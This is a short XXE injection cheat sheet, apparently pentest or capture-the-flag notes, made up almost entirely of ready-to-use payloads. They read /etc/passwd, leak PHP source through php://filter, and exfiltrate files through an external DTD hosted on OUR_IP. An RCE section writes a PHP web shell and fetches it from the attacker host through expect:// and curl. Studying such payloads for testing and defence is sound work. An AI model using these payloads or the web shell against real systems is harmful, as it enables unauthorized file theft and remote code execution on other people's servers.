##### Identify
```xml
<!DOCTYPE email [
  <!ENTITY xxe "Pwn3d!">
]>

<object>
&xxe;
</object>
```

##### LFI
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<object>
&xxe;
</object>
```

##### Source code (PHP)
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

<object>
&xxe;
</object>
```

##### RCE
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
updog -p 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```

##### LFI w/ CDATA (Vendor neutral)
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
updog -p 80
```

Injection
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

##### Error Based XXE
Create error by changing tag
```xml
<root>asd</roo>
```

Host payload
```bash
vi xxe.dtd
```
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
```bash
updog -p 80
```

Inject
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP/xxe.dtd">
  %remote;
  %error;
]>
```